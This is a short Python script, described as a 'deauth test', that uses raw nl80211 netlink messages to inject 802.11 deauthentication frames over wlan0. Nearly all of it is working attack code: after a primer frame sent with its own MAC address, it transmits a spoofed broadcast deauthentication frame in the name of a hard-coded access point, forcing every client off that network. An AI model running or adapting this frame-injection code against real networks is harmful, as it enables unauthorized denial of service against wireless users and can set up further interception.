#!/usr/bin/env python3
"""Ultra-minimal deauth test - closest to debug_deauth.py as possible"""
import socket, struct, fcntl

NETLINK_GENERIC = 16

def get_nl80211_family_id():
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
    s.bind((0, 0))
    attr = struct.pack('HH', 12, 2) + b'nl80211\0'
    genlhdr = struct.pack('BBH', 3, 1, 0)
    nlhdr = struct.pack('IHHII', 16+len(genlhdr)+len(attr), 16, 1|4, 1, 0)
    s.send(nlhdr + genlhdr + attr)
    resp = s.recv(4096)
    off = 20
    nllen = struct.unpack_from('I', resp, 0)[0]
    while off < nllen:
        alen, atype = struct.unpack_from('HH', resp, off)
        if atype == 1:
            fid = struct.unpack_from('H', resp, off+4)[0]
            s.close()
            return fid
        off += (alen+3) & ~3
    s.close()
    return None

def get_ifindex(ifname):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    result = fcntl.ioctl(sock.fileno(), 0x8933, struct.pack('256s', ifname.encode()))
    sock.close()
    return struct.unpack('i', result[16:20])[0]

def nla(atype, data):
    alen = 4 + len(data)
    padded = (alen+3) & ~3
    return struct.pack('HH', alen, atype) + data + b'\0'*(padded - alen)

fid = get_nl80211_family_id()
ifidx = get_ifindex('wlan0')

# Get our MAC
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
info = fcntl.ioctl(sock.fileno(), 0x8927, struct.pack('256s', b'wlan0'))
our_mac = info[18:24]
sock.close()

bssid = bytes.fromhex('046761d6dc92')
broadcast = b'\xff\xff\xff\xff\xff\xff'

print(f"fid={fid} ifidx={ifidx} our_mac={our_mac.hex(':')}")

# Create socket - EXACTLY like debug_deauth.py
s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
s.bind((0, 0))
s.settimeout(2)

# FIRST: Send a deauth with OUR MAC as SA (not spoofed)
deauth_own = struct.pack('<HH', 0x00c0, 0)
deauth_own += broadcast + our_mac + bssid
deauth_own += struct.pack('<HH', 0x10, 7)

attrs_p = nla(3, struct.pack('I', ifidx))
attrs_p += nla(38, struct.pack('I', 2412))
attrs_p += nla(51, deauth_own)
attrs_p += struct.pack('HH', 4, 118)
genlhdr_p = struct.pack('BBH', 59, 1, 0)
payload_p = genlhdr_p + attrs_p
nlhdr_p = struct.pack('IHHII', 16+len(payload_p), fid, 1|4, 10, 0)
s.send(nlhdr_p + payload_p)
resp_p = s.recv(4096)
nltype_p = struct.unpack_from('H', resp_p, 4)[0]
if nltype_p == 2:
    errno_p = struct.unpack_from('i', resp_p, 16)[0]
    print(f"Primer deauth (own SA) response: nltype={nltype_p} errno={errno_p}")
else:
    print(f"Primer deauth (own SA) response: nltype={nltype_p}")

# THEN: Send spoofed deauth (like debug_deauth.py test 3)
frame = struct.pack('<HH', 0x00c0, 0)
frame += broadcast + bssid + bssid
frame += struct.pack('<HH', 0x20, 7)

print(f"Frame: {frame.hex()}")

# Build EXACTLY like debug_deauth.py
attrs = nla(3, struct.pack('I', ifidx))
attrs += nla(38, struct.pack('I', 2412))
attrs += nla(51, frame)
attrs += struct.pack('HH', 4, 118)  # DONT_WAIT_FOR_ACK
genlhdr = struct.pack('BBH', 59, 1, 0)
payload = genlhdr + attrs
nlhdr = struct.pack('IHHII', 16+len(payload), fid, 1|4, 30, 0)
msg = nlhdr + payload

print(f"NL msg ({len(msg)}b): {msg.hex()}")

s.send(msg)

try:
    resp = s.recv(4096)
    nllen, nltype = struct.unpack_from('IH', resp, 0)
    print(f"Response: nltype={nltype} nllen={nllen}")
    if nltype == 2:
        errno = struct.unpack_from('i', resp, 16)[0]
        print(f"errno={errno}")
    else:
        print(f"hex: {resp[:64].hex()}")
except socket.timeout:
    print("TIMEOUT")

s.close()
